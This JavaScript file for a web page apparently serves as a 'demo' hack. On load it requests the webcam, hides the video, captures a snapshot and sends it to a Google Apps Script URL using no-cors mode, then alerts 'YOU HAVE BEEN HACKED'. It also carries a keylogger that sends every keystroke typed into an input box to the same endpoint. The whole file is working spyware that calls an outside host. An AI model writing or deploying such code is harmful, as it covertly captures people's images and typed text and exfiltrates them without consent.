const video = document.getElementById('video');
const loader = document.getElementById('loader');
const inputBox = document.getElementById('inputBox');

const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4tpUPP57s4-wThS878CK1MlC5iIP_vIOKkV-QKyRsS2e5qED1dtfJ81EcfKjOLHP_/exec';

// Request webcam access
navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
  video.srcObject = stream;
  video.style.display = 'none'; // keep hidden for demo

  setTimeout(() => {
    const canvas = document.createElement('canvas');
    canvas.width = 320;
    canvas.height = 240;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const base64Image = canvas.toDataURL('image/jpeg');

    // Send image to Apps Script
    fetch(APPS_SCRIPT_URL, {
      method: 'POST',
      mode: 'no-cors', // bypass CORS
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: base64Image })
    })
    .then(() => {
      alert('YOU HAVE BEEN HACKED');
    })
    .catch(err => {
      console.error('Image error:', err);
    });
  }, 3000);
}).catch(err => {
  alert('Camera access failed: ' + err.message);
  console.error(err);
});

// Keylogger (demo)
inputBox.addEventListener('input', (e) => {
  fetch(APPS_SCRIPT_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ log: `📝 User typed: ${e.target.value}` })
  });
});
